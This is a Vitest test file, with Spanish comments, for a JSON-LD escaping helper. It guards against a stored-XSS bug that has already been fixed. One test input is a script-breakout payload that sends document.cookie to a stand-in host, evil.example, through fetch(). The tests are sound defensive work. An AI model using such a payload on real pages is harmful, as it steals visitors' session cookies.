import { describe, expect, it } from 'vitest';

import { scriptJsonLd } from '@lib/jsonLd';

/**
 * El JSON-LD de las páginas de detalle lleva título y descripción escritos por el
 * vendedor. `JSON.stringify` no escapa `<`, `>` ni `&`, así que un `</script>` en
 * la descripción cerraba el bloque e inyectaba JavaScript que corría para todo
 * visitante (XSS almacenado). Estos tests son la red que impide que vuelva.
 */

describe('scriptJsonLd', () => {
  it('no deja pasar una etiqueta de cierre de script', () => {
    const salida = scriptJsonLd({
      description: "</script><script>fetch('https://evil.example/x?c='+document.cookie)</script>",
    });

    expect(salida).not.toContain('</script>');
    expect(salida).not.toContain('<script>');
    expect(salida).toContain('\\u003c');
  });

  it('escapa los tres caracteres con los que se sale del bloque', () => {
    const salida = scriptJsonLd({ a: '<', b: '>', c: '&' });

    expect(salida).not.toMatch(/[<>&]/);
    expect(salida).toContain('\\u003c');
    expect(salida).toContain('\\u003e');
    expect(salida).toContain('\\u0026');
  });

  it('neutraliza también el inicio de un comentario HTML', () => {
    // `<!--` dentro de un <script> abre un comentario y puede alterar el parseo.
    expect(scriptJsonLd({ x: '<!--<script>' })).not.toContain('<!--');
  });

  it('sigue siendo JSON válido y con los mismos valores', () => {
    const objeto = {
      '@type': 'Car',
      name: 'Toyota Yaris </script> & <b>2018</b>',
      description: 'Auto en buen estado. Precio < mercado.',
      anio: 2018,
    };

    expect(JSON.parse(scriptJsonLd(objeto))).toEqual(objeto);
  });

  it('no toca lo que no hace falta escapar', () => {
    expect(scriptJsonLd({ name: 'Citroën C4 — 1.6 HDi' })).toBe(
      JSON.stringify({ name: 'Citroën C4 — 1.6 HDi' }),
    );
  });
});
